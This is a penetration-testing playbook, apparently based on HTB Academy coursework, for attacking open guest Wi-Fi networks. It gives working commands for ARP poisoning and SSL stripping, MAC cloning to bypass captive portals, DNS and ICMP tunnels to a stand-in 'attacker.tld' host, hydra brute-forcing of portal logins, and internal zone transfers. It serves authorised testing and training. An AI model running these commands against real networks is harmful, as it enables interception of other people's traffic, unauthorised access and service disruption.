# Wireless - Open networks, guest SSIDs and captive portals

## What to test the moment you are on an open network

**Trigger:** An in-scope SSID shows `OPN`, or you have joined a guest network.

An open network has no key to attack, so the entire assessment is about what the network lets you reach and what it lets you do to the other people on it. Four questions decide everything that follows, and answering them takes minutes. Where does the DHCP lease put you, and what is the gateway — a `10.x` or `192.168.x` NAT segment behind a consumer-grade gateway is a different world from a routable corporate range. Is client isolation enforced, meaning can you see and reach the other stations on the same AP; if you can, every device on the guest network is a target and the network's own users are attackable. Does the segment route anywhere beyond the internet, which is the segmentation question and the one with the largest consequence. And is there a captive portal, which is both an authentication boundary to test and an application to attack in its own right. Establish all four before doing anything clever, because they determine whether this network is a dead end or the way in.

```bash
sudo iw dev wlan0 connect "CorpWiFi-Guest"
sudo dhclient wlan0

ip addr show wlan0
ip route ; route -n                          # gateway and any extra routes
cat /etc/resolv.conf                         # DNS servers — often internal

# Client isolation: can you see the other stations?
sudo nmap -v -n -sn 200.200.200.0/24 | awk '/is up/{print up}; {gsub(/\(|\)/,""); up=$NF}'
sudo arp-scan --interface=wlan0 --localnet

# Does the segment route beyond the internet?
ip route get 10.0.0.1 ; ip route get 172.16.0.1 ; ip route get 192.168.1.1
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Abusing the Guest Wi-Fi Network

## Testing client isolation, and attacking the clients when it is absent

**Trigger:** An `nmap` ping sweep of the guest segment returns hosts other than the gateway and yourself.

Client isolation — sometimes called AP isolation or peer-to-peer blocking — prevents stations on the same access point from addressing each other, and its absence is the single most consequential misconfiguration on a guest network because it converts a public wireless service into a shared LAN full of visitors' laptops and phones. Test it by sweeping the segment and then by trying to reach a discovered host directly; a sweep that returns other stations proves it is off. Once confirmed, the guest network is an ordinary internal network from an attack point of view: scan the discovered hosts, look for exposed services, and treat anything listening as a target within your scope. Be disciplined about scope here, because the hosts you have just discovered are other people's devices and not all of them belong to the organisation that hired you — a personal phone on the guest network is not in scope no matter how reachable it is. Where isolation *is* enforced, note that a MAC-collision attack can still cause a denial of service against a specific client by impersonating its address, which is a distinct weakness from isolation itself.

```bash
echo "200.200.200.60" > scope
sudo nmap --open -iL scope                       # services on a discovered station
sudo nmap -sV -sC --open -p- 200.200.200.60      # full, once isolation is confirmed off

# Isolation enforced but MAC impersonation still possible:
sudo macchanger -m 8E:1A:9E:78:50:64 wlan0       # clone an associated client
#   -> MAC collision, service disruption for that client
#   Distinct from the isolation weakness; see client-side-and-dos.md
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Abusing the Guest Wi-Fi Network

## ARP spoofing and HTTPS interception on an open segment

**Trigger:** Client isolation is absent, other stations are active, and you want to demonstrate interception.

With isolation off you can position yourself between a client and the gateway by poisoning both ARP caches, after which all of that client's traffic passes through you. The interesting part is what you can do with it, because almost everything is TLS-protected and simply relaying it proves nothing. `ettercap` offers three approaches and they fail differently. **SSL interception** presents your own certificate, so it works only if the user accepts the browser's warning — which is a client-behaviour test as much as a network one, and a user who clicks through is the finding. **SSL stripping** downgrades HTTPS links to HTTP by rewriting them in transit, which is largely dead against sites using HSTS and preloading but still works against internal applications and older devices. **DNS spoofing** redirects a name to a host you control and runs into the same certificate problem. Run the poisoning without specifying a target so every host in the list is included, or name a specific victim to keep the blast radius small — on a live network the untargeted form is disruptive. Enable IP forwarding first, or the client's traffic stops at you and you have caused an outage instead of an interception.

```bash
sudo sysctl -w net.ipv4.ip_forward=1

sudo ettercap -G                                  # GUI: interface -> wlan0 -> accept
#   Scan for Hosts -> Hosts List -> select targets
#   SSL Intercept -> confirm HTTPS is listed for IPv4
#   MITM -> ARP poisoning -> Sniff remote connections

# Command line equivalent, scoped to one victim and the gateway
sudo ettercap -T -q -i wlan0 -M arp:remote /200.200.200.1// /200.200.200.60//

# sslstrip variant
sudo ettercap -T -q -i wlan0 -P sslstrip -M arp:remote /200.200.200.1// /200.200.200.60//

# Alternative toolchain
sudo bettercap -iface wlan0
#   net.probe on ; set arp.spoof.targets 200.200.200.60 ; arp.spoof on ; net.sniff on

# Restore the ARP caches when finished — ettercap does this on clean exit
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Abusing the Guest Wi-Fi Network

## Captive portal bypass

**Trigger:** A guest network places you behind a portal at the gateway and you want internet or internal access without valid credentials.

A captive portal is an authorisation layer bolted onto an open network, and it almost always enforces that authorisation by tracking which MAC and IP have paid or logged in — which means the bypasses attack the tracking rather than the login page. The most reliable is MAC impersonation: find a station that is already authenticated, clone its address, and the portal treats you as that session. That works because the portal cannot distinguish two devices claiming the same address, and it is why a portal on an unisolated network is weak by construction. The second family is protocol tunnelling: portals usually allow DNS and sometimes ICMP outbound before authentication so that name resolution and connectivity checks work, and a tunnel over either carries arbitrary traffic through the hole at low bandwidth. The third is finding the portal's own allow-list — walled-garden entries for payment providers, the AP vendor's cloud, or a hotel's own domain frequently permit outbound traffic that can be reused. Test each and record which the portal resists; a portal that survives MAC cloning because it also pins the IP and the session cookie is meaningfully better than one that does not.

```bash
# 1. Find an authenticated station, then clone it
sudo airodump-ng -c 6 --bssid 52:CD:8C:79:AD:87 wlan0mon      # station list
sudo ip link set wlan0 down
sudo macchanger -m 2A:B6:1A:63:7A:BC wlan0
sudo ip link set wlan0 up && sudo dhclient wlan0

# 2. Is DNS open before authentication?
dig @8.8.8.8 example.com
nslookup example.com 200.200.200.1
#   resolution working pre-auth -> DNS tunnel
#   server side: iodined -f -c -P password 10.0.0.1 tunnel.attacker.tld
iodine -f -P password tunnel.attacker.tld

# 3. ICMP open?
ping -c 3 8.8.8.8
sudo ptunnel-ng -p attacker.tld -l 8000

# 4. Walled-garden hosts the portal permits pre-auth
curl -sI http://200.200.200.1/ | head
curl -s http://captive.corp.local/ | grep -Eo 'https?://[^"]+' | sort -u
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Abusing the Guest Wi-Fi Network; operator practice

## Attacking the portal application itself

**Trigger:** The portal presents a login form, and credentials obtained elsewhere have not worked.

The portal is a web application on the gateway and deserves to be treated as one rather than as a wireless control. Fingerprint it first — the server header, the realm on a basic-auth prompt, and the page's own assets usually name the product, and a named product means a version and a CVE search. Then work the ordinary web angles: default credentials for the vendor, credential reuse from anything already recovered on the engagement, injection in the login parameters, and unauthenticated endpoints that the portal exposes for its own operation. Portals are commonly built into consumer or small-business gateway firmware, which means the code is often old and the same request handler that serves the login page may accept parameters it does not validate. If the portal authenticates against a backend directory, credentials harvested from a rogue AP elsewhere in the engagement will frequently work here, which is the usual way the guest network and the corporate network turn out to be connected. Where the portal itself is the target, the gateway behind it is the more valuable one.

```bash
nmap -sV -sC -p 80,443,8080,8443 200.200.200.1
curl -sI http://200.200.200.1/
whatweb http://200.200.200.1/

# Basic auth: hydra wants user:pass pairs with -C
sed -e 's/^/admin:/' /opt/wordlist.txt > combos.txt
hydra -C combos.txt 200.200.200.1 -s 80 http-get /

# Form-based login
hydra -l admin -P /opt/wordlist.txt 200.200.200.1 \
  http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"

# Then the gateway itself -> wireless-infrastructure.md
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Router Exploitation

## Guest-to-corporate segmentation testing

**Trigger:** You have an address on a guest or BYOD network and need to know whether it reaches anything internal.

This is the highest-value test on any guest network, because a weak guest passphrase matters enormously if the guest VLAN routes to internal infrastructure and barely at all if it does not. Work outward from what the network told you. The DHCP lease frequently reveals internal DNS servers or domain search suffixes even on a segment that is supposed to be isolated, and an internal DNS server that answers you is both a leak and a mapping tool — reverse lookups and an attempted zone transfer can enumerate the internal estate from the guest network. Then probe the private ranges directly for reachability rather than assuming the gateway blocks them. Check whether the gateway itself is dual-homed, since a gateway with an interface on both segments is the bridge. And test the other SSIDs on the same physical AP: BSSIDs differing only in the last octet are usually several networks on one radio, and misconfigured VLAN assignment between them is a common finding. Record what is reachable and what is filtered, because the difference is the segmentation boundary.

```bash
# What the lease itself leaks
cat /var/lib/dhcp/dhclient.leases | grep -E "domain-name|domain-search|domain-name-servers"
cat /etc/resolv.conf

# Internal DNS answering from a guest segment
dig @<internal-dns> corp.local ANY
dig @<internal-dns> -x 10.0.0.1
dig @<internal-dns> corp.local AXFR                  # zone transfer

# Reachability into private space
for net in 10.0.0 172.16.10 192.168.1; do
  sudo nmap -sn -n --max-retries 1 ${net}.0/24 | grep -B1 "Host is up"
done
sudo nmap -Pn -n -p 445,3389,88,389 172.16.10.0/24 --open

# Is the gateway dual-homed?
sudo nmap -sV -O 200.200.200.1
snmpwalk -v2c -c public 200.200.200.1 1.3.6.1.2.1.4.20    # interface addresses

# Anything reachable -> post-access-pivot.md
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Abusing the Guest Wi-Fi Network, Compromising an Enterprise Wi-Fi Network
